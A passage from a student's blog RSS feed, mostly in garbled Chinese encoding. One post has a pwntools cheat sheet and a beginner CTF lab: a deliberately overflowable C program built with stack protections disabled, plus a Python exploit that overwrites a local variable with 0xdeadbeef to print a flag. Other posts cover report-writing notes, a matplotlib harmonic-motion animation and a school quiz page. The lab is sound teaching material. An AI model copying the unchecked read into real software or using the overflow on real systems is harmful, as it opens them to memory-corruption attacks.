0x0000000000400c66 &amp;lt;+366&amp;gt;:	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Â∞á
{=&amp;gt; 0x75} ÁÇ∫nopÊåá‰ª§ {=&amp;gt; 0x90}&lt;img src=&quot;https://hackmd.io/_uploads/Hkgv-Id5T.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1&gt;PWN&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Êì∑ÂèñÊèêÁ§∫&lt;img src=&quot;https://hackmd.io/_uploads/SkT8aI_9T.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;pwntools Â∏∏Áî®ÊäÄË°ì ==&amp;gt;&lt;a href=&quot;https://github.com/MyFirstSecurity2020/ProgSec/blob/main/4-5.md&quot;&gt;Âá∫Ëôï&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ËºâÂÖ•pwntoolsÂ•ó‰ª∂ ==&amp;gt; from pwn import * # ÂèØÂ∞áÊâÄÊúâÂ≠êÊ®°ÁµÑÂíå‰∏Ä‰∫õÂ∏∏Áî®ÁöÑÁ≥ªÁµ±ÂáΩÊï∏Â∫´Â∞éÂÖ•&lt;/li&gt;
&lt;li&gt;Âª∫Á´ãËàáÁ®ãÂºèÈÄ£Áµê(connection)&lt;ul&gt;
&lt;li&gt;ËàáÈÅ†Á´ØÁ®ãÂºè(‰ΩøÁî®remote())&lt;ul&gt;
&lt;li&gt;conn = remote(&amp;#39;ip_address&amp;#39;, port_num)&lt;/li&gt;
&lt;li&gt;conn = remote(&amp;#39;173.4.5.1&amp;#39;, 8888)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ËàáÊú¨Âú∞Á´ØÁ®ãÂºè(‰ΩøÁî®process())==&amp;gt; conn = process(&amp;#39;./pwn1&amp;#39;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Êé•Êî∂Ë≥áÊñô receive&lt;ul&gt;
&lt;li&gt;recv(numb=1096, timeoutxtdefault)ÔºöÊé•Êî∂ÊåáÂÆö‰ΩçÂÖÉÁµÑÊï∏ÁöÑË≥áÊñô&lt;/li&gt;
&lt;li&gt;recvall()ÔºöÊé•Êî∂Ë≥áÊñôÁõ¥Âà∞ EOF&lt;/li&gt;
&lt;li&gt;recvline(keepends=True)ÔºöÊé•Êî∂‰∏ÄË°åÔºåÂèØÈÅ∏ÊìáÊòØÂê¶‰øùÁïôË°åÂ∞æÁöÑ \n&lt;/li&gt;
&lt;li&gt;recvlines(N):Êé•Êî∂ NË°åËº∏Âá∫&lt;/li&gt;
&lt;li&gt;recvrepeat(timeoutxtdefault)ÔºöÊé•Êî∂Ë≥áÊñôÁõ¥Âà∞ EOF(END of FILE) Êàñ timeout&lt;/li&gt;
&lt;li&gt;recvuntil(delims, timeoutxtdefault)ÔºöÊé•Êî∂Ë≥áÊñôÁõ¥Âà∞ delims Âá∫Áèæ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ÂÇ≥Ë≥áÊñô&lt;ul&gt;
&lt;li&gt;send(data)ÔºöÁôºÈÄÅË≥áÊñô&lt;/li&gt;
&lt;li&gt;sendline(data)ÔºöÁôºÈÄÅ‰∏ÄË°åÔºåÈ†êË®≠ÊúÉÂú®Ë°åÂ∞æÂä† \n&lt;/li&gt;
&lt;li&gt;sendlineafter(delims, Ë¶ÅÈÄÅÂá∫ÁöÑË≥áÊñô)ÔºöÂæû delims Âá∫ÁèæÂæå,Â∞áË¶ÅÈÄÅÂá∫ÁöÑË≥áÊñô ÂÇ≥ÈÄÅÁµ¶Á®ãÂºè&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;‰∫íÂãï ==&amp;gt; conn.interactive()&lt;ul&gt;
&lt;li&gt;ÂèØÂêåÊôÇÂ∞çÈÅ†Á´ØÁ≥ªÁµ±ËÆÄÂØ´Ë≥áÊñô&lt;/li&gt;
&lt;li&gt;Áõ∏Áï∂ÊñºÂõûÂà∞ shell Ê®°ÂºèÈÄ≤Ë°å‰∫íÂãï&lt;/li&gt;
&lt;li&gt;Âú®ÂèñÂæó shell ‰πãÂæåË™øÁî®&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/A951860555/article/details/110990925&quot;&gt;pwntoolsÂ∑•ÂÖ∑ÁöÑ‰ΩøÁî®&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ÁØÑ‰æã /DATA202401/pwn&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//pass.c
#include&amp;quot;stdio.h&amp;quot;
#include&amp;quot;stdlib.h&amp;quot;
int main(){
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  int token = 1234;
  char key[16];
  printf(&amp;quot;Billy left his key in the locked room.\n&amp;quot;);
  printf(&amp;quot;However, he forgot the token of the room.\n&amp;quot;);
  printf(&amp;quot;Do you know what&amp;#39;s the key?&amp;quot;);
  read(0, key, 40);
  if((int)token == 0xdeadbeef){
    printf(&amp;quot;Door open. OwO\n&amp;quot;);
    system(&amp;quot;cat ./flag&amp;quot;);
  }else{
    printf(&amp;quot;Cannot open door. QwQ\n&amp;quot;);
  }
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•Êåá‰ª§&lt;ul&gt;
&lt;li&gt;&lt;code&gt;gedit pass.c&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gcc -fno-stack-protector -z execstack pass.c -o pass -no-pie&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;socat TCP-LISTEN:21004,fork EXEC:&amp;#39;./pass&amp;#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-python=&quot;&gt;#pass.py
from pwn import *
r = process(&amp;#39;./pass&amp;#39;)
r = remote(&amp;#39;localhost&amp;#39;,21004)
payload = b&amp;#39;B&amp;#39;*28
r.sendline(payload+ p64(0xdeadbeef))
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;py&lt;img src=&quot;https://hackmd.io/_uploads/r1R8dvOca.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;flag&lt;img src=&quot;https://hackmd.io/_uploads/HkxG9Duc6.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Áî®gdbÁúã‰∏Ä‰∏ã ==disabled!==&lt;img src=&quot;https://hackmd.io/_uploads/rJhAcwucT.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Áî®radare2ÂéªÁúãmain&lt;img src=&quot;https://hackmd.io/_uploads/S19Ujwucp.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Áü•ÈÅì‰∏ãÈù¢ÁöÑÊòØÂì™ÈÇäÊòØfalseÂ∞±ÂèØ‰ª•ÂéªÁî®Âú∞ÂùÄ‰∫Ü&lt;img src=&quot;https://hackmd.io/_uploads/HyzTjvu5p.png&quot; alt=&quot;image&quot;&gt;&lt;ul&gt;
&lt;li&gt;ÂÖ∂‰∏≠ÁöÑËÆäÊï∏&lt;img src=&quot;https://hackmd.io/_uploads/SyrXnDO9T.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Áõ∏‰∫ícompare&lt;img src=&quot;https://hackmd.io/_uploads/SyRrnD_5a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sun, 28 Jan 2024 20:32:21 GMT</pubDate></item><item><title>2024È´ò‰∏≠ËÅ∑Â∞èË´ñÊñáÂ∞àÈ°åÁ†îÁøí</title><link>https://yih-0118.github.io/blog/2024%E9%AB%98%E4%B8%AD%E8%81%B7%E5%B0%8F%E8%AB%96%E6%96%87%E5%B0%88%E9%A1%8C%E7%A0%94%E7%BF%92/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/2024%E9%AB%98%E4%B8%AD%E8%81%B7%E5%B0%8F%E8%AB%96%E6%96%87%E5%B0%88%E9%A1%8C%E7%A0%94%E7%BF%92/</guid><description>ÂçàÈ§êÂæàËÆöÊé®Ëñ¶</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/2024%E9%AB%98%E4%B8%AD%E8%81%B7%E5%B0%8F%E8%AB%96%E6%96%87%E5%B0%88%E9%A1%8C%E7%A0%94%E7%BF%92/&quot;&gt;https://yih-0118.github.io/blog/2024%E9%AB%98%E4%B8%AD%E8%81%B7%E5%B0%8F%E8%AB%96%E6%96%87%E5%B0%88%E9%A1%8C%E7%A0%94%E7%BF%92/&lt;/a&gt;&lt;/blockquote&gt; &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;ÂØ¶Ë∏êXÁ•ûÂ•áÂ∞èË´ñÊñá&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1&gt;Â∞èË´ñÊñáÊí∞ÂØ´ËàáÂè£È†≠ÁôºË°®&lt;/h1&gt;
&lt;h2&gt;Ê†°Èï∑„ÅÆÁúüÂøÉÂù¶Èú≤&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ÂØ¶Ë∏êÂ§ßÂ≠∏Ê†°Èï∑Ëä±‰∏âÂ∞èÊôÇÂú®Ê≤ñÈ¶¨Ê°∂&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ÈòøÊø±Âú®ÊªëÊâãÊ©ü‰∏çË™çÁúü&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;ÂØ¶Ë∏êÊúâÊ≤íÊúâÂú∞ÁêÜÁ≥ªÔºüÊàñÊòØ‰Ω†ÂèØ‰ª•ÂâµÔºå‰Ω†Â§™ÂóÜ‰∫Ü„ÄÇÁúüÂÅá„ÄÇ&lt;/li&gt;
&lt;li&gt;Ê†°Èï∑Â•ΩÂ§öÂûÉÂúæË©±Ôºå‰ΩÜ‰ªñÊØîÈÇ£ÂÄãÊúâË∂£&lt;/li&gt;
&lt;li&gt;Ê†°Èï∑ÊúâËêΩÈªûÂàÜÊûêÔºåÂè™Âõ†Èï∑Ê±üÂèØ‰ª•Ë∑üÊøÅÊ∞¥Ê∫™ÊØî&lt;/li&gt;
&lt;li&gt;‰ªñË™™ÊàëÂÄëÂæàÂπ¥Ëºï&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;‰ªñË™™ÈòøÊø±ÂæàÂπ¥Ëºï„Ñè&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Â∞èË´ñÊñáÊí∞ÂØ´Ê≥®ÊÑè‰∫ãÈ†ÖÔºü&lt;/h2&gt;
&lt;h3&gt;ÈáçÈªûÂú®‰ΩïÔºü&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ÊÄùËÄÉËá™Â∑±ÊÉ≥Ë¶Å‰ªÄÈ∫ºÔºü&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2&gt;Â§ßÂ§ßÊñπÂêë&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Bk0Wd1AtT.jpg&quot; alt=&quot;IMG_1885&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ÈÄôÊòØÁõÆÈåÑ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H1I3_JRt6.jpg&quot; alt=&quot;55682&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ÂÅèË≥™/ÂÅèÈáèÊñπÂêë&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ByqA_y0F6.jpg&quot; alt=&quot;55683&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;‰Ω†Ë¶ÅÊúÉÊÄùËÄÉÔºå‰∫∫‰∫∫ÈÉΩÊòØ&lt;strong&gt;Á¨õÂç°Áàæ&lt;/strong&gt;ÔΩûÔΩû&lt;ul&gt;
&lt;li&gt;ÊàëÊÄùÊïÖÊàëÂú®&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJ2qYk0Ka.jpg&quot; alt=&quot;55685_0&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ÊñπÂêë&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Bynhty0FT.jpg&quot; alt=&quot;55686_0&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Âπ´Êâã&lt;/li&gt;
&lt;li&gt;ÊÉ≥Ë¶Å‰ªÄÈ∫ºÔºåÂ¶Ç‰Ωï‚ÄúÂØ¶Ë∏ê‚ÄùÔºåÊáÇÁöÑÊâæÂπ´Âä©&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2&gt;Â∞èË´ñÊñáÊû∂Êßã&lt;/h2&gt;
&lt;h3&gt;ÂâçË®Ä&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S1MQcJAt6.jpg&quot; alt=&quot;55687&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ÂâçË®ÄË™ûÊëòË¶Å‰∏ç‰∏ÄÊ®£ÔºÅÔºÅ&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Á∂ìÈ©ó&lt;/li&gt;
&lt;li&gt;ÂéüÂõ†&lt;/li&gt;
&lt;li&gt;ÂïèËá™Â∑±ÁöÑÁ¨¨‰∏ÄÂÄãÂïèÈ°å&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ÊñáÁçªÊé¢Ë®é&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ÂèÉËÄÉÊñáÁçªÂàóÈªû-ÈñãË≥áÊñôÂ§æ/Â≠òÊà™ÂúñÔºà5 ÂèÉËÄÉÊñáÁçªÈúÄË¶ÅÔºâ&lt;/li&gt;
&lt;li&gt;Êõ∏Ê´É-ÂõûÈ°ßÔºåÈÅøÂÖçÊñπÂêëÈåØ&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Á†îÁ©∂ÊñπÊ≥ï&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ÂïèÂç∑Áµ±Ë®à&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Ë™ûÊÑè„ÄÅÊ®°Á≥äÁïåÂÆö&lt;/li&gt;
&lt;li&gt;ÂèçÂêëÈ°å&lt;/li&gt;
&lt;li&gt;ÈÅøÂÖçÈñãÊîæÂºè&lt;/li&gt;
&lt;li&gt;Á∂≤Ë∑Ø eg.SurveyMonkey&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;ÂØ¶È©óÁ†îÁ©∂Ê≥ï&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;ÊñáÁçªÂàÜÊûêÊ≥ï&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Ê©´Ë∑®Ë≥™/ÈáèÂåñ&lt;/li&gt;
&lt;li&gt;ÊñáÂ≠óÈõ≤&lt;/li&gt;
&lt;li&gt;Êü•Ë©¢&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;Áî∞ÈáéË™øÊü•Ê≥ï&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;ÂèÉËàá&lt;/li&gt;
&lt;li&gt;Êõ∏Â∫´Áøª&lt;/li&gt;
&lt;li&gt;ÂÆ¢ËßÄÂà§Êñ∑&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;&lt;p&gt;ÂúñË°®È°ûÂûã
&lt;img src=&quot;https://hackmd.io/_uploads/HkxcA1Rta.jpg&quot; alt=&quot;IMG_1888&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Ë™™ÊïÖ‰∫ã
&lt;img src=&quot;https://hackmd.io/_uploads/rkvRJlCtp.jpg&quot; alt=&quot;IMG_1890&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Ê∫ñÂÇôÁôºË°®&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;‰∏ªÈ°å&lt;/li&gt;
&lt;li&gt;ÈÅéÁ®ã&lt;/li&gt;
&lt;li&gt;Á†îÁ©∂ÊñπÊ≥ï&lt;/li&gt;
&lt;li&gt;ÂøÉÂæó&lt;/li&gt;
&lt;li&gt;Á∞°Â†±Ë£Ω‰Ωú&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;ÂàóÈªûÂèñ‰ª£Âè•Â≠ê&lt;/li&gt;
&lt;li&gt;ÊúÄÂ§öÂÖ≠ÂÄã&lt;/li&gt;
&lt;li&gt;Ëâ≤ÂΩ©‰∏çË¶ÅÂ§™Â§ö&lt;/li&gt;
&lt;li&gt;Â≠óÈ´î30‰ª•‰∏ä&lt;/li&gt;
&lt;li&gt;ÂñÆ‰∏Ä&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;‰∏äÂè∞Á∑¥Áøí&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Ê≤àÈªò&lt;/li&gt;
&lt;li&gt;Âí¨Â≠óÊ≠•Ë™ø&lt;/li&gt;
&lt;li&gt;ËÇ¢È´î&lt;/li&gt;
&lt;li&gt;Ë™™ÊïÖ‰∫ã&lt;/li&gt;
&lt;li&gt;Â∞èÂç°ÔºàÈóúÈçµÂ≠óÔºâ&lt;/li&gt;
&lt;li&gt;Áí∞Â¢É&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;Á∑äÂºµ&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Ê∫êÈ†≠&lt;/li&gt;
&lt;li&gt;Ê¨°Êï∏&lt;/li&gt;
&lt;li&gt;ÁõÆÁöÑ&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2&gt;Ë≥áË®äÂ≠∏Áæ§ÁöÑÁöÑÁöÑÊù±Ë•øÔºü&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Êµ∑ÊôØÁ¨¨‰∏ÄÊéíüò≤&lt;/strong&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/B1G6NWCKa.jpg&quot; alt=&quot;55698_0&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Ë≥áÊñôÊêúÈõÜÔºüÔºüÔºü&lt;/h2&gt;
&lt;p&gt;ÔºÅ
‰∏çË¶Å‰∏ÄÁõ¥ÊªëË∑™
@Hannah-ch
@yih0118 Ë™∞Âú®Êªë&lt;/p&gt;
&lt;h3&gt;Â≠∏Ë°ìÂÄ´ÁêÜ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ë™†ÂØ¶&lt;/li&gt;
&lt;li&gt;Â∞äÈáç&lt;/li&gt;
&lt;li&gt;Âö¥Ë¨π&lt;/li&gt;
&lt;li&gt;Ë™≤Ë≤¨&lt;/li&gt;
&lt;li&gt;ÈÄèÊòé&lt;/li&gt;
&lt;li&gt;Â∞äÈáçÁâàÊ¨ä¬©Ô∏è&lt;/li&gt;
&lt;li&gt;ÂèØ‰ª•ÂéªÂúãÂúñÊâæË≥áÊñô&lt;/li&gt;
&lt;li&gt;ÂúãÂÆ∂ÂúñÊõ∏È§®Âè∞ÁÅ£ÊúüÂàäÊñáÁçªË≥áË®äÁ∂≤&lt;ul&gt;
&lt;li&gt;ÊúâÈóúÈçµÂ≠óÂèØÁî®&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://sites.google.com/g2.usc.edu.tw/citation/%E5%BC%95%E8%BF%B0-%E6%94%B9%E5%AF%AB-%E6%91%98%E5%AF%AB&quot;&gt;ÂºïËø∞ ÊîπÂØ´ ÊëòÂØ´&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;‰ΩúËÄÖÔºåË•øÂÖÉÂπ¥ÔºåÈ†Å ‰∏çÂèØÂ∞ë &lt;strong&gt;Ôºà‰∏çÁÑ∂Â∞±ÊòØÊûóÊô∫Â†ÖÔºâ&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ethics.moe.edu.tw/&quot;&gt;Ëá∫ÁÅ£Â≠∏Ë°ìÂÄ´ÁêÜÊïôËÇ≤Ë≥áÊ∫ê‰∏≠ÂøÉ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/S1A4R70Yp.jpg&quot; alt=&quot;55709&quot;&gt;&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Wed, 24 Jan 2024 08:51:06 GMT</pubDate></item><item><title>Á∞°Ë´ßÈÅãÂãï</title><link>https://yih-0118.github.io/blog/%E7%B0%A1%E8%AB%A7%E9%81%8B%E5%8B%95/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E7%B0%A1%E8%AB%A7%E9%81%8B%E5%8B%95/</guid><description>Âú®ÂÆ∂Ê≤í‰∫ãÂÅöÂ∞±ÂØ´‰∫Ü</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E7%B0%A1%E8%AB%A7%E9%81%8B%E5%8B%95/&quot;&gt;https://yih-0118.github.io/blog/%E7%B0%A1%E8%AB%A7%E9%81%8B%E5%8B%95/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;ÊíøÈûãÈÅãÂãï&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkKsWklYa.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt
import matplotlib.animation as animation
from matplotlib.font_manager import fontManager
plt.rcParams[&amp;#39;font.sans-serif&amp;#39;] = [&amp;#39;SimHei&amp;#39;] 
plt.rcParams[&amp;#39;axes.unicode_minus&amp;#39;] = False  
fig = plt.figure(figsize=(7,7))
ax1 = fig.add_subplot(1,1,1)
ax2 = fig.add_subplot(2,1,1)
ax3 = fig.add_subplot(3,1,1)
fig.subplots_adjust(hspace=.45)
k = 100
m = 20
w = np.sqrt(k/m)
phi = 2
A = 2
p = 2*np.pi/w
f = 1/p
print(&amp;quot;Period:&amp;quot;,p,&amp;quot;seconds&amp;quot;,sep=&amp;quot; &amp;quot;)
print(&amp;quot;f:&amp;quot;,f,&amp;quot;Hz&amp;quot;,sep=&amp;quot; &amp;quot;)
print(&amp;quot;k: &amp;quot;,k,&amp;quot;N/m&amp;quot;,sep=&amp;quot; &amp;quot;)
def fun(t):
    global w,phi,A
    return A*np.sin(w*t+phi)
def vel(t):
    global w,phi,A
    return A*w*np.cos(w*t+phi)
def acceleration(t):
    global w,phi,A
    return -A*w**2*np.sin(w*t+phi)
def position(x):
    x1 = x-1
    x2 = x+1
    y1 = 1 
    y2 = -1
    p1 = [x1,y2]
    p2 = [x2,y2]
    p3 = [x2,y1]
    p4 = [x1,y1]
    return [p1,p2,p3,p4]
cnt = 0
xt = [0]
yt = [0]
vy = [0]
acy = [0]
def animate(i):
    global cnt, xt,yt,A,vy,acy
    ax3.clear()
    plt.subplot(311)
    plt.xlim(-3.5,3.5)
    plt.ylim(-2,2)
    plt.xlabel(&amp;quot;x&amp;quot;)
    plt.ylabel(&amp;quot;y&amp;quot;)
    plt.title(&amp;quot;ÊíøÈûãÈÅãÂãï&amp;quot;)   
    p1 = [position(fun(cnt))[0][0],position(fun(cnt))[0][1]]
    p2 = [position(fun(cnt))[1][0],position(fun(cnt))[1][1]]
    p3 = [position(fun(cnt))[2][0],position(fun(cnt))[2][1]]
    p4 = [position(fun(cnt))[3][0],position(fun(cnt))[3][1]]
    x = [p1[0],p2[0],p3[0],p4[0],p1[0]]
    y = [p1[1],p2[1],p3[1],p4[1],p1[1]]
    linex = [-4,p1[0]]
    liney = [0,0]   
    plt.plot(x,y,lw=3,color=&amp;quot;blue&amp;quot;)
    plt.plot(linex,liney,color=&amp;quot;red&amp;quot;,ls=&amp;quot;:&amp;quot;,lw=3)
    plt.subplot(312)
    xt.append(cnt)
    vy.append(vel(cnt))
    plt.title(&amp;quot;ÈÄüÂ∫¶&amp;quot;)
    plt.xlim(0,15)
    plt.ylim(-A*w-0.5,A*w+0.5)
    plt.plot(xt,vy,lw=1,color=&amp;quot;gray&amp;quot;)
    plt.plot([0,15],[0,0],lw=0.5,color=&amp;quot;black&amp;quot;)
    plt.subplot(313)
    acy.append(acceleration(cnt))
    plt.title(&amp;quot;Âä†ÈÄüÂ∫¶&amp;quot;)
    plt.xlim(0,15)
    plt.ylim(-A*w**2-0.5,A*w**2+0.5)
    plt.plot(xt,acy,lw=1,color=&amp;quot;gray&amp;quot;)
    plt.plot([0,15],[0,0],lw=0.5,color=&amp;quot;black&amp;quot;)   
    cnt += 0.1  
ani = animation.FuncAnimation(fig,animate,interval=2)
plt.show()
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sat, 13 Jan 2024 10:08:22 GMT</pubDate></item><item><title>MLSH ÁÇ∫Ê†°ÊÖ∂ÁîüÂá∫ÁöÑÂ•áÊÄ™‰ΩúÂìÅ</title><link>https://yih-0118.github.io/blog/mlsh-%E7%82%BA%E6%A0%A1%E6%85%B6%E7%94%9F%E5%87%BA%E7%9A%84%E5%A5%87%E6%80%AA%E4%BD%9C%E5%93%81/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/mlsh-%E7%82%BA%E6%A0%A1%E6%85%B6%E7%94%9F%E5%87%BA%E7%9A%84%E5%A5%87%E6%80%AA%E4%BD%9C%E5%93%81/</guid><description>ÂøÉÊúâÔº£Ôº£ÁÑâ</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/mlsh-%E7%82%BA%E6%A0%A1%E6%85%B6%E7%94%9F%E5%87%BA%E7%9A%84%E5%A5%87%E6%80%AA%E4%BD%9C%E5%93%81/&quot;&gt;https://yih-0118.github.io/blog/mlsh-%E7%82%BA%E6%A0%A1%E6%85%B6%E7%94%9F%E5%87%BA%E7%9A%84%E5%A5%87%E6%80%AA%E4%BD%9C%E5%93%81/&lt;/a&gt;&lt;/blockquote&gt; &lt;ul&gt;
&lt;li&gt;Â•áËë©Ê†°ÊÖ∂Á§æÂúòÈùúÊÖãÂ±ï&lt;/li&gt;
&lt;/ul&gt;
&lt;!--more --&gt;

&lt;h1&gt;Á≠îÈ°åÈÅäÊà≤Ë£Ω‰Ωú‰ªãÁ¥π&lt;/h1&gt;
&lt;p&gt;&lt;del&gt;(‰∏¶Ê≤íÊúâÁÇ∫ÈõªËÖ¶ÂÑ™ÂåñÁïåÈù¢Âñî)&lt;/del&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Github ÈÄ£ÁµêÔºö&lt;a href=&quot;https://github.com/yih-0118/mlsh.github.io&quot;&gt;https://github.com/yih-0118/mlsh.github.io&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Á∂≤È†ÅÈÄ£ÁµêÔºö&lt;a href=&quot;https://yih-0118.github.io/mlsh.github.io/%E6%A0%A1%E6%A0%A1%E6%85%B6%E6%85%B6/index.html&quot;&gt;https://yih-0118.github.io/mlsh.github.io/%E6%A0%A1%E6%A0%A1%E6%85%B6%E6%85%B6/index.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;HTML&lt;/h2&gt;
&lt;h3&gt;Âª∫Á´ãÊ®ôÈ°å&lt;/h3&gt;
